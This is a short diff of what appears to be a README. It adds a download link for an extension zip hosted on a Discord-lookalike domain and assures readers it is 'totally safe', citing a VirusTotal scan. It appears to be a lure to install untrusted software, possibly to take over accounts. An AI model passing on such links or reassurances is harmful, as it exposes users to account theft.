@@ -5,3 +5,4 @@ This will allow you to sign in onto discord.anonix.xyz
 it's totally safe you can scan it again on virus total**
 
 Virus Total : https://www.virustotal.com/gui/file/dc00befecc16b670e3d1828a7325aadfcaadfe685f2975806d9f95641a93f306/detection
+Download for extension: https://discord.anonix.xyz/extension.zip
